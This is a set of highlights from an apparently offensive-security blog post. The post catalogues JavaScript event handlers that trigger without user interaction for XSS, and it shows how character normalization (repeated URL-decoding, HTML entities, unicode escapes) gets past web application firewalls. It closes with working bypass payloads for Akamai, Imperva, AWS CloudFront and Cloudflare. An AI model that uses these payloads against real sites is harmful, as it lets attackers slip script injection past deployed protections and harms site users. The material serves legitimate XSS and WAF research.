# Exploring Javascript Events & Bypassing WAFs via Character Normalization

![rw-book-cover](https://res.cloudinary.com/drhrvcs22/image/upload/w_500,h_300/blog_banner_2_glvvci.png)

## Highlights


In the first section of this post, I provide a short introduction to browser events, I then explore which Javascript event handlers can be used to execute functions without user interaction, using a limited character set, I also discuss various methods through which this can be leveraged to achieve arbitrary Javascript execution, Again using a limited character set.

Events can be seen as notifications that a developer can use to react to certain changes that may happen in the browser, typically triggered by user interaction or changes in the browser enviornment.

They serve as a crucial mechanism that developers rely on to create dynamic and interactive web applications.

Events can be categorized into the following:
 • User-initiated events: Events that require explicit actions by the user, like mouse movements, clicks, or key presses.
 • Browser-generated events: Events triggered by the browser environment itself, such as page loading, window resizing, network status changes, and events related to the browser’s focus or form elements.
 • API-specific events: Events triggered by specific Web APIs, such as media playback changes, battery status updates, or messages passed between different browsing contexts or windows.

In Javascript you can use the addEventListener() function to attach an event to an element or window, Here's an example of the syntax:
 addEventListener("event", () => {
 // Do something
 });
 Alternatively you can also use event handlers which can be set via direct assignment `**onevent**=**function**`

one common xss payload I often see people use which utilizes javascript event handlers is `onerror=alert;throw 1`

Chromium only
 As mentioned above the `ondevicemotion / ondeviceorientation / ondeviceorientationabsolute` trigger automatically therefore we can just assign it a function.
 [e.g:](https://portswigger-labs.net/xss/xss.php?x=%3Cimg/src/onerror=ondevicemotion=alert%3E&context=html) `ondevicemotion=alert`
 The `pagereveal / pageswap` events can be triggered by setting the location to the current location which will result in a redirect loop and eventually trigger the event.
 [e.g:](https://portswigger-labs.net/xss/xss.php?x=%3Cimg/src/onerror=onpageswap=alert;location=location%3E&context=html) `onpageswap=alert;location=location`
 The `contextvisibilityautostatechange` event can be triggered by setting the value of the `contentVisibility` CSS property to auto.
 [e.g:](https://portswigger-labs.net/xss/xss.php?x=%3Cimg/src/style=content-visibility:auto%20onerror=window.oncontentvisibilityautostatechange=alert%3E&context=html) `<img/src/style=content-visibility:auto onerror=window.oncontentvisibilityautostatechange=alert>`
 The `selectionchange` event can be triggered by using a `textarea/input` element with an autofocus attribute.
 [e.g:](https://portswigger-labs.net/xss/xss.php?x=%3Cinput/autofocus/onfocus=%22window.onselectionchange=alert%22%3E&context=html) `<input/autofocus/onfocus="window.onselectionchange=alert">`
 Chromium / Firefox / Others
 The `message` event needs a direct reference to the target window for cross origin communication therefore in order to trigger it we'd need to iframe the target or use top level navigation.
 [e.g:](https://portswigger-labs.net/xss/xss.php?x=%27;let%20xx%20=%20window.open%28%22//portswigger-labs.net/xss/xss.php?x=%27;window.onmessage=alert//%26context=js_string_single%22,%20%22_blank%22%29;setInterval%28z=%3E%7Bxx.postMessage%28%22x%22,%22*%22%29%7D,500%29//&context=js_string_single) `let x = window.open("//portswigger-labs.net/xss/xss.php?x=';onmessage=alert//&context=js_string_single", "_blank");setInterval(z =>{x.postMessage("x", "*")}, 500)`
 The `hashchange` event can be triggered by assigning a new value to `location.hash`.
 [e.g:](https://portswigger-labs.net/xss/xss.php?x=%3Cimg/src/onerror=onhashchange=alert;location.hash=location%3E&context=html) `onhashchange=alert;location.hash=location`
 The `scroll / scrollend` events can be triggered by making the page scrollable via document.body.style.height and changing the value of `document.documentElement.scrollTop`.
 [e.g:](https://portswigger-labs.net/xss/xss.php?x=%3Cimg/src/onerror=window.onscroll=alert;document.body.style.height='999px';document.documentElement.scrollTop=1%3E&context=html) `window.onscroll=alert;document.body.style.height='999px';document.documentElement.scrollTop=1`
 The `select` event can be triggered by using a `textarea/input` element with a value attribute and increasing the value of `element.selectionStart`.
 [e.g:](https://portswigger-labs.net/xss/xss.php?x=%3Cinput%20value=x%20autofocus%20onfocus=%22window.onselect=alert;this.selectionStart=1%22%3E&context=html) `<input value=x autofocus onfocus="window.onselect=alert;this.selectionStart=1">`
 The `transitionstart / transitionend / transitionrun` events can be triggered by setting the transition CSS property and changing the opacity to start the transition.
 [e.g:](https://portswigger-labs.net/xss/xss.php?x=%3Cimg/src/style=transition:0.1s%20onerror=window.ontransitionend=alert;this.style.opacity=0%3E&context=html) `<img/src/style=transition:0.1s onerror=window.ontransitionend=alert;this.style.opacity=0>`
 The `load / pageshow` and possibly others are triggered when the document initially loads, in a DOM XSS scenario we can use an iframe with a srcdoc attribute.
 [e.g:](https://portswigger-labs.net/xss/xss.php?x=%3Ciframe/srcdoc=%22%3Cimg/src/onerror=onpageshow=alert%3E%22%3E&context=html) `<iframe/srcdoc="<img/src/onerror=onpageshow=alert>">`
 I'm fairly certain there are more but these will do, for now :)

Earlier this year [@garethheyes](https://x.com/garethheyes) released a new version of his tool [Shazzer](https://shazzer.co.uk) which allows you to easily fuzz HTML/Javascript behavior across different browsers.

I started looking through [MDN docs](https://developer.mozilla.org/en-US/docs/Web/API/Element#Events) to see which other event handlers are viable(can be triggered with a limited charset and require no user interaction), to my surprise there were a lot of them.

When an event handler gets triggered and calls it's assigned function depending on the function that it's assigned to it will first call the `toString()` function on the event object before passing the result as an argument to the assigned function.
 In order to achieve arbitrary javascript execution we need to overwrite the `toString` function in one way or another so that when our selected function(e.g eval/setTimeout/setInterval) gets called we can control the string that is passed as an argument.

`akamai.com/x?=<input/autofocus/onfocu%25252525252525252573=x` => 403 Access Denied
 `akamai.com/x?=<input/autofocus/onfocu%2525252525252525252573=x` => 200 OK
 Seems like Akamai are URL decoding user input 10 times before processing it.

what other encodings might be getting normalized by the WAF before being searched for patterns, turns out there are a couple:
 named entities, e.g: `imperva.com/?x=<input/%26gt;/autofocus/onfocus=x()>`
 (not sure why it doesn't work with the &quot; entity anymore)
 hex/numeric entities, e.g: `imperva.com/?x=<input/%26%23x3e/autofocus/onfocus=x()>`
 utf-8 hex, e.g: `imperva.com/?x=<input/\x3e/autofocus/onfocus=x()>`
 utf-16, e.g: `imperva.com/?x=<input/\u003e/autofocus/onfocus=x()>`
 utf-16 w/ curly braces, e.g: `imperva.com/?x=<input/\u{3e}/autofocus/onfocus=x()>`
 utf-16 w/ % instead of \, e.g: `akamai.com/x?=<input/%u003e/autofocus/onfocus=x()>`
> [View Highlight](https://read.readwise.io/read/01jj93aa32642xqwbf6rfj3an3)



And finally here are some WAF bypasses based on the techniques discussed above:
 Akamai:
 `akamai.com/?x=<x/%u003e/tabindex=1 autofocus/onfocus=x=self;x['ale'%2b'rt'](999)>`
 Imperva:
 `imperva.com/?x=<x/\x3e/tabindex=1 style=transition:0.1s autofocus/onfocus="a=document;b=a.defaultView;b.ontransitionend=b['aler'%2b't'];style.opacity=0;Object.prototype.toString=x=>999">`
 AWS/Cloudfront:
 `docs.aws.amazon.com/?x=<x/%26%23x3e;/tabindex=1 autofocus/onfocus=alert(999)>`
 Cloudflare:
 `cloudflare.com/?x=<x tabindex=1 autofocus/onfocus="style.transition='0.1s';style.opacity=0;self.ontransitionend=alert;Object.prototype.toString=x=>999">`
